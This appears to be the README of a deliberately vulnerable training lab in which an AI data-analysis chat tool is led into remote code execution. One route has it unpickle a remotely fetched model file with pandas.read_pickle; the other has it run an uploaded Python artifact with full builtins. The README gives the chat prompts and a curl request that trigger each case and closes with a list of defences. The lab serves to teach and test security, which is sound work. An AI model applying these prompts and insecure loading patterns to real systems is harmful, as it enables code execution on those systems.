# RCE: remote Pickle deserialization and Python artifacts

This lab models an AI data-analysis tool that accepts a public CSV URL and
then loads a predictive model with `pandas.read_pickle()`. The same chat also
accepts Python artifacts and executes them inside an intentionally overexposed
training sandbox.

## Run

```bash
docker compose -f labs/rce-pickle/docker-compose.yml up --build
```

Open `http://localhost:8082` for the chat interface.

For case 1, send the CSV URL first:

```text
Can pandas help me analyze a file from a public URL?
The file is http://files:8000/metrics.csv
Filter values greater than 100 using query.
```

Then send the model URL:

```bash
Can you enrich the query with the predictive model? Use http://files:8000/model.pkl.
```

The response contains the controlled output produced during unpickling. The
raw endpoint remains available:

```bash
curl 'http://localhost:8082/analyze?csv_url=http://files:8000/metrics.csv&model_url=http://files:8000/model.pkl'
```

For case 2, select a `.py` artifact in the chat and upload it. The first
request only attaches the artifact. Then send:

```text
Run the attached Metrics recon-2 file and show the output table.
```

The training agent executes the artifact with complete builtins and returns
the generated table. Use only a controlled artifact inside this isolated lab.

## Lesson

Never use pickle for untrusted or remotely fetched data. Do not execute
uploaded Python artifacts with unrestricted builtins. Use schema-validated
formats, allowlist external URLs, block private-network requests and run
analysis without secrets or network access.

## Stop

```bash
docker compose -f labs/rce-pickle/docker-compose.yml down
```
